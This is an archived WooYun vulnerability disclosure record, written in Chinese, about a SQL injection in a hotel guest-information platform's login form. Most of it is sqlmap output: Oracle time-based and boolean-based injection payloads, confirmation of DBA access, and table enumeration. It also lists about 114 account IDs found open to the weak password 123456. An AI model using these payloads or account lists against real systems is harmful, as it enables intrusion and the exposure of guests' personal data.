{"id": 71531, "wybug_id": "wooyun-2015-0146071", "wybug_title": "某旅馆信息采集平台SQL注入（DBA权限\\24个数据库\\可导致大量旅客开房信息存在泄露风险）", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "路人甲", "wybug_date": "2015-10-12 09:41", "wybug_open_date": "2015-11-30 15:10", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-30：\t细节向公众公开  简要描述： 跟着大牛的步伐走。登录处还有SQL注入，DBA权限，可导致海量旅客信息存在泄露风险（开房信息/身份证/姓名/宾馆/房间号等等） 详细说明：  http://**.**.**.**/bugs/wooyun-2015-0136013洞主虽然没有把地址贴出来，但是图片没有打好码，地址还是给出来了！~~~首先测试了一下洞主所说的弱口令，发现已经被修改了！~~~难道已经联系上对方了？那就测试下是否含有注入吧。丢给Fiddler抓包，然后丢给sqlmap进行测试分析，发现果然还有注入。\nhttp://**.**.**.**:235/dylgy/login.aspx (POST)__VIEWSTATE=/wEPDwUKLTMwNzAzNzM0NQ9kFgICAw9kFgICAw9kFgJmD2QWAgIBD2QWBAIBDw9kFgIeCm9uS2V5UHJlc3MFHU5leHRGb2N1cyhldmVudCwndGJQYXNzd29yZCcpZAIFDw9kFgIfAAVdaWYoZXZlbnQua2V5Q29kZT09MTMpIHsgdmFyIGJ0bkxvZ2luPWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdpYnRMb2dpbicpOyBidG5Mb2dpbi5jbGljaygpOyB9ZBgBBR5fX0NvbnRyb2xzUmVxdWlyZVBvc3RCYWNrS2V5X18WAQUIaWJ0TG9naW7pw45887GUljKUBlZQ%2BPf0rwigoQ%3D%3D&tbUser=admin&tbPassword=123456&hdCert=&hdSSL=&hdSerial=&__EVENTVALIDATION=/wEWCALQv5HxCgLGvdL3AQKr8tnHBgK3jsrkBAKM54rGBgLL/Yu6AwKt6sazBAKu4tDbCgyA4kQ683ve96Rc0gSsis5/BKx3&ibtLogin.x=41&ibtLogin.y=17\n未添加测试参数--level 5 --risk 3测试结果为Oracle AND time-based blind类型注入\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: tbUser    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: __VIEWSTATE=/wEPDwUKLTMwNzAzNzM0NQ9kFgICAw9kFgICAw9kFgJmD2QWAgIBD2QWBAIBDw9kFgIeCm9uS2V5UHJlc3MFHU5leHRGb2N1cyhldmVudCwndGJQYXNzd29yZCcpZAIFDw9kFgIfAAVdaWYoZXZlbnQua2V5Q29kZT09MTMpIHsgdmFyIGJ0bkxvZ2luPWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdpYnRMb2dpbicpOyBidG5Mb2dpbi5jbGljaygpOyB9ZBgBBR5fX0NvbnRyb2xzUmVxdWlyZVBvc3RCYWNrS2V5X18WAQUIaWJ0TG9naW7pw45887GUljKUBlZQ+Pf0rwigoQ==&tbUser=admin' AND5817=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(115)||CHR(118)||CHR(72),5) AND 'LHCW'='LHCW&tbPassword=123456&hdCert=&hdSSL=&hdSerial=&__EVENTVALIDATION=/wEWCALQv5HxCgLGvdL3AQKr8tnHBgK3jsrkBAKM54rGBgLL/Yu6AwKt6sazBAKu4tDbCgyA4kQ683ve96Rc0gSsis5/BKx3&ibtLogin.x=41&ibtLogin.y=17---[09:00:17] [INFO] the back-end DBMS is Oracleweb server operating system: Windows 2003 or XPweb application technology: Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Oracle[09:00:17] [INFO] fetching current user[09:00:17] [WARNING] multi-threading is considered unsafe in time-based data retrieval. Going to switch it off automatically[09:00:17] [WARNING] time-based comparison needs larger statistical model. Making a few dummy requests, please wait..do you want sqlmap to try to optimize value(s) for DBMS delay responses (option'--time-sec')? [Y/n] y[09:00:28] [WARNING] it is very important not to stress the network adapter's bandwidth during usage of time-based payloads[09:00:39] [INFO] adjusting time delay to 1 second due to good response timesSPECIALcurrent user:    'SPECIAL'[09:01:08] [INFO] fetching current database[09:01:08] [INFO] resumed: SPECIAL[09:01:08] [WARNING] on Oracle you'll need to use schema names for enumeration as the counterpart to database names on other DBMSescurrent schema (equivalent to database on Oracle):    'SPECIAL'[09:01:08] [INFO] testing if current user is DBAcurrent user is DBA:    True\n\n\n添加测试参数--level 5 --risk 3测试结果为OR boolean-based blind - WHERE or HAVING clause和Oracle AND time-based blind类型注入\nsqlmap identified the following injection points with a total of 467 HTTP(s) requests:---Place: POSTParameter: tbUser    Type: boolean-based blind    Title: OR boolean-based blind - WHERE or HAVING clause    Payload: __VIEWSTATE=/wEPDwUKLTMwNzAzNzM0NQ9kFgICAw9kFgICAw9kFgJmD2QWAgIBD2QWBAIBDw9kFgIeCm9uS2V5UHJlc3MFHU5leHRGb2N1cyhldmVudCwndGJQYXNzd29yZCcpZAIFDw9kFgIfAAVdaWYoZXZlbnQua2V5Q29kZT09MTMpIHsgdmFyIGJ0bkxvZ2luPWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdpYnRMb2dpbicpOyBidG5Mb2dpbi5jbGljaygpOyB9ZBgBBR5fX0NvbnRyb2xzUmVxdWlyZVBvc3RCYWNrS2V5X18WAQUIaWJ0TG9naW7pw45887GUljKUBlZQ+Pf0rwigoQ==&tbUser=-6205' OR (8434=8434) AND 'hQWw'='hQWw&tbPassword=123456&hdCert=&hdSSL=&hdSerial=&__EVENTVALIDATION=/wEWCALQv5HxCgLGvdL3AQKr8tnHBgK3jsrkBAKM54rGBgLL/Yu6AwKt6sazBAKu4tDbCgyA4kQ683ve96Rc0gSsis5/BKx3&ibtLogin.x=41&ibtLogin.y=17    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: __VIEWSTATE=/wEPDwUKLTMwNzAzNzM0NQ9kFgICAw9kFgICAw9kFgJmD2QWAgIBD2QWBAIBDw9kFgIeCm9uS2V5UHJlc3MFHU5leHRGb2N1cyhldmVudCwndGJQYXNzd29yZCcpZAIFDw9kFgIfAAVdaWYoZXZlbnQua2V5Q29kZT09MTMpIHsgdmFyIGJ0bkxvZ2luPWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdpYnRMb2dpbicpOyBidG5Mb2dpbi5jbGljaygpOyB9ZBgBBR5fX0NvbnRyb2xzUmVxdWlyZVBvc3RCYWNrS2V5X18WAQUIaWJ0TG9naW7pw45887GUljKUBlZQ+Pf0rwigoQ==&tbUser=admin' AND5001=DBMS_PIPE.RECEIVE_MESSAGE(CHR(100)||CHR(85)||CHR(90)||CHR(86),5) AND 'NOeD'='NOeD&tbPassword=123456&hdCert=&hdSSL=&hdSerial=&__EVENTVALIDATION=/wEWCALQv5HxCgLGvdL3AQKr8tnHBgK3jsrkBAKM54rGBgLL/Yu6AwKt6sazBAKu4tDbCgyA4kQ683ve96Rc0gSsis5/BKx3&ibtLogin.x=41&ibtLogin.y=17---[09:12:36] [INFO] the back-end DBMS is Oracleweb server operating system: Windows 2003 or XPweb application technology: Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Oracle[09:12:36] [INFO] fetching current user[09:12:36] [INFO] retrieving the length of query output[09:12:36] [INFO] retrieved: 7[09:13:11] [INFO] retrieved: SPECIALcurrent user:    'SPECIAL'[09:13:11] [INFO] fetching current database[09:13:11] [INFO] retrieving the length of query output[09:13:11] [INFO] resumed: 7[09:13:11] [INFO] resumed: SPECIAL[09:13:11] [WARNING] on Oracle you'll need to use schema names for enumeration as the counterpart to database names on other DBMSescurrent schema (equivalent to database on Oracle):    'SPECIAL'[09:13:11] [INFO] testing if current user is DBAcurrent user is DBA:    True\n\n\n\nDatabase: SPECIAL+-------------+---------+| Table       | Entries |+-------------+---------+| STATIONLIST | 1188    || MESSAGE     | 4       |+-------------+---------+Database: SPECIALTable: STATIONLIST[20 columns]+-----------------+----------+| Column          | Type     |+-----------------+----------+| CSLX            | VARCHAR2 || CURRENTNO       | NUMBER   || DATENOW         | VARCHAR2 || DIALBZID        | NUMBER   || DIALTIMELIST    | CLOB     || DIALTYPE        | VARCHAR2 || ENCODESTATIONID | VARCHAR2 || HDTYPE          | VARCHAR2 || HTYPE           | VARCHAR2 || LINCUN          | VARCHAR2 || PASSWORD        | VARCHAR2 || PHONEIDLIST     | VARCHAR2 || SFSW            | VARCHAR2 || SL_USEFLAG      | NUMBER   || SL_VERSION      | VARCHAR2 || STATIONID       | VARCHAR2 || STATIONNAME     | VARCHAR2 || TBSJ            | DATE     || UPLOADFLAG      | VARCHAR2 || XUHAO           | NUMBER   |+-----------------+----------+\n\n\n\n\n\n\n\n\n\n\n\n\n   漏洞证明：  \n\n\n\n爆破根据http://**.**.**.**/bugs/wooyun-2015-0136013所提供的地址以及宾馆的代码，采用弱口令进行爆破测试2000个帐号试试5106230000-5106232000测试弱口令123456\n\n\n\nLength为4541表示该帐号为弱口令\n\n2000个里面有114个，可进入获得大量旅客信息。下面帮忙打码！~~~\nPayload510623000151062300025106230011510623000451062300125106230010510623000951062300145106230016510623000651062300185106230022510623002151062300285106230026510623002751062300325106230034510623003551062300365106230020510623003851062300395106230040510623004151062300375106230042510623004351062300465106230047510623004551062300495106230050510623005151062300525106230048510623005351062300545106230055510623005651062300585106230060510623002951062300615106230063510623006551062300675106230064510623007151062300705106230074510623007251062300785106230079510623008151062300875106230033510623009451062300965106230097510623009251062300885106230103510623008951062301065106230107510623010451062301095106230114510623011551062301135106230116510623011851062301205106230117510623011151062301225106230124510623013551062301375106230140510623014151062301435106230142510623014551062301485106230146510623013951062301515106230152510623015751062301595106230162510623015051062301645106230163510623016751062301655106230156510623016951062301735106230176510623016651062301805106230126510623018151062301825106230186510623017451062301875106230185510623017951062301885106230189\nLength为4546表示该帐号为过期用户\n\nLength为4558表示该帐号为密码非123456\n\nLength为4657、4658表示该帐号即将过期\n\n\n\n\n\n\n\n\n\n\n\n\n\n   修复方案：  过滤修复强化口令   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2015-10-16 15:08 厂商回复： 暂未建立与网站管理单位的直接处置渠道,待认领. 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}